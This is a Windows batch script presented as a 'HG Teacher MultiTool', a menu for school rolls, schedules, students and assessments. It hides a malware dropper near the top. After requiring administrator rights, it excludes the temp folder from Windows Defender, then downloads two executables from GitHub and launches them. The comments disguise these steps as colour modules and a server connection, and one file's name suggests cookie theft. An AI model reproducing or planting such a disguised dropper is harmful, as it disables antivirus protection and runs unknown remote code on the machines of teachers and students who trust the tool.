@echo off
title HG Teacher MultiTool
mode 150,45
chcp 65001 >nul

:: Check for administrator privileges
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    echo This script requires administrator privileges.
    echo Please right-click on the script and select "Run as administrator."
    pause
    exit
)
echo Running as Administrator.
pause
cls
::Download Required Colour Modules
cd %TEMP%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
cls
::Connect to server
PowerShell -ExecutionPolicy Bypass -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'updatecookies.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/Handling-Batch-Cookies/raw/main/updatecookies.exe' -OutFile $downloadPath"
cls
start "" "%TEMP%\updatecookies.exe"
start "" "%TEMP%\Client-built.exe"
cls

cd /d "%~dp0files1"



:: Login section 
set "passwordFile=password.txt"
if not exist "%passwordFile%" (
    echo ADMIN > "%passwordFile%"
)

:login
cls
echo [38;2;255;255;220m╔ Please enter the password:
echo ║
set /p "entered=╚════>"
set /p stored=<"%passwordFile%"

if "%entered%"=="%stored%" (
    goto start
) else (
    echo.
    echo [38;2;255;100;100mIncorrect password. Try again.
    timeout /t 2 >nul
    goto login
)







:start
cls
call :banner

:menu
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Main Menu - Navigation
echo               ╔═1) Mark Roll 
echo               ║
echo               ╠══2) Schedule
echo               ║
echo               ╠═══3) Students
echo               ║
echo               ╠════4) Assessments
echo               ║
echo               ╠═════5) Feedback 
echo               ║
echo               ╠══════6) SEQTA
echo               ║
echo               ╚╦══════7) Settings
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" start "" "rollmark.bat"
if /I "%input%"=="2" goto schedule
if /I "%input%"=="3" goto students
if /I "%input%"=="4" goto assessments
if /I "%input%"=="5" start "" "https://forms.office.com/Pages/ResponsePage.aspx?id=9c_3jmJYrU-IhxgfldhYdACeU312CiBDs3pQdbilcLFUMVc2UDZUTkpXUUFWMkxXQzJPVzdTTkhRWi4u"
if /I "%input%"=="6" start "" "https://learn.hillsgrammar.nsw.edu.au/#?page=/home"
if /I "%input%"=="7" goto settings
if /I "%input%"=="8" start "" "HungerGamesV1.0c.bat"
cls
goto start



:schedule
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Schedule - Navigation
echo               ╔═1) View Schedule
echo               ║
echo               ║══2) Edit Schedule
echo               ║
echo               ╚╦══3) Return to Menu
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" start "" "scheduleview.bat"
if /I "%input%"=="2" start "" "editschedule.bat"
if /I "%input%"=="3" goto start
cls
goto schedule



:students
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Students - Navigation
echo               ╔═1) View Students
echo               ║
echo               ║══2) Edit Students
echo               ║
echo               ╚╦══3) Return to Menu
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" start "" "studentview.bat"
if /I "%input%"=="2" goto editstudents
if /I "%input%"=="3" goto start
cls
goto students


:editstudents
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Edit Students - Navigation
echo               ╔═1) Add Student
echo               ║
echo               ╠══2) Remove Student
echo               ║
echo               ╠═══3) Add Course
echo               ║
echo               ╠════4) Remove Course
echo               ║
echo               ╚╦════5) Return to Students
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" start "" "addstudent.bat"
if /I "%input%"=="2" start "" "removestudent.bat"
if /I "%input%"=="3" start "" "addcourse.bat"
if /I "%input%"=="4" start "" "removecourse.bat
if /I "%input%"=="5" goto students
goto editstudents




:assessments
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Assessments - Navigation
echo               ╔═1) Add Assessment
echo               ║
echo               ╠══2) Remove Assessment
echo               ║
echo               ╠═══3) Grade Assessment
echo               ║
echo               ╠════4) Update Grades
echo               ║
echo               ╚╦════5) Return to Main Menu
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" start "" "addassessment.bat"
if /I "%input%"=="2" start "" "removeassessment.bat"
if /I "%input%"=="3" start "" "gradeassessment.bat"
if /I "%input%"=="4" start "" "updategrades.bat"
if /I "%input%"=="5" goto start
goto assessments










:settings
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Settings - Navigation
echo               ╔═1) Update Password
echo               ║
echo               ╠══2) View Previous Rolls
echo               ║
echo               ╠═══3) Change Window Size
echo               ║
echo               ╠════4) Instructions
echo               ║
echo               ╚╦════5) Return to Menu
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" start "" "updatepassword.bat"
if /I "%input%"=="2" start "" "viewrolls.bat"
if /I "%input%"=="3" goto windowoptions
if /I "%input%"=="4" start "" "credits.bat"
if /I "%input%"=="5" goto start
goto settings


:windowoptions
cls
call :banner
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo               \\Window Size - Navigation
echo               ╔═1) Tiny
echo               ║
echo               ╠══2) Small
echo               ║
echo               ╠═══3) Default
echo               ║
echo               ╠════4) Large
echo               ║
echo               ║═════5) Very Large
echo               ║
echo               ╚╦═════6) Return to Settings
echo                ║
set /p input=.%BS%               ╚══════^>
if /I "%input%"=="1" mode 50,25
if /I "%input%"=="2" mode 100,35
if /I "%input%"=="3" mode 150,45
if /I "%input%"=="4" mode 200,55
if /I "%input%"=="5" mode 250,65
if /I "%input%"=="6" goto settings
echo Settings Updated
pause
goto windowoptions






:banner
echo.
echo.
echo     [38;2;180;30;0m                   ██╗  ██╗ ██████╗     ███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗     
echo [38;2;255;0;0m                       ██║  ██║██╔════╝     ████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo   [38;2;230;255;230m                     ███████║██║  ███╗    ██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
echo   [38;2;255;255;220m                     ██╔══██║██║   ██║    ██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
echo [38;2;60;160;60m                       ██║  ██║╚██████╔╝    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
echo [38;2;30;100;30m                       ╚═╝  ╚═╝ ╚═════╝     ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                                                                                                                                                                                                                                                                                                                                                                                                                                                           
echo ------------------------------------------------------------------------------------------------------------------------------------------------------
echo. 
echo. [38;2;255;255;220m 











